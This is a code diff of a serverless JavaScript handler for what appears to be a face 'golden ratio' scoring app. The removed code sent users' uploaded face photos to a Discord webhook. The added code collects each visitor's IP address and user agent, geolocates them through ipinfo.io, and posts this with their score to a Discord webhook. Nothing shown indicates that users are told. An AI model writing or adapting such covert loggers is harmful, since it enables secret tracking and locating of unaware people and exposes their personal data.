@@ -1,37 +1,57 @@
 export const handler = async (event) => {
-  try {
-    const body = JSON.parse(event.body || "{}");
-    const image = body.image;
-    if (!image) {
-      return { statusCode: 400, body: "no image" };
-    }
+  const webhook = process.env.DISCORD_WEBHOOK_URL;
+  const ipinfoToken = process.env.IPINFO_TOKEN;
 
-    // base64 → バイナリ
-    const base64 = image.split(",")[1];
-    const buffer = Buffer.from(base64, "base64");
-    const blob = new Blob([buffer], { type: "image/png" });
-
-    const form = new FormData();
-    form.append("file", blob, "face.png");
-    form.append("content", "📸 新しい画像が送信されました");
-
-    const res = await fetch(process.env.DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      body: form
-    });
-
-    if (!res.ok) {
-      throw new Error("Discord webhook error");
-    }
-
-    return {
-      statusCode: 200,
-      body: "ok"
-    };
-  } catch (e) {
-    return {
-      statusCode: 500,
-      body: e.message
-    };
+  if (!webhook) {
+    return { statusCode: 500, body: "Webhook not set" };
   }
+
+  const body = JSON.parse(event.body);
+
+  // IP取得
+  const ip =
+    event.headers["x-forwarded-for"]?.split(",")[0] ||
+    event.headers["client-ip"] ||
+    "unknown";
+
+  const ua = event.headers["user-agent"] || "unknown";
+
+  // 国・地域取得
+  let country = "unknown";
+  let city = "unknown";
+
+  try {
+    const res = await fetch(
+      `https://ipinfo.io/${ip}?token=${ipinfoToken}`
+    );
+    const data = await res.json();
+    country = data.country || country;
+    city = data.city || city;
+  } catch {}
+
+  const time = new Date().toLocaleString("ja-JP", {
+    timeZone: "Asia/Tokyo"
+  });
+
+  const message =
+`📸 顔診断結果
+黄金比：${body.score}%
+ランク：${body.rank}
+
+🌍 国：${country}
+🏙️ 都市：${city}
+🌐 IP：${ip}
+🖥️ UA：${ua}
+⏰ 時刻：${time}`;
+
+  await fetch(webhook, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: message })
+  });
+
+  return {
+    statusCode: 200,
+    body: "sent"
+  };
 };
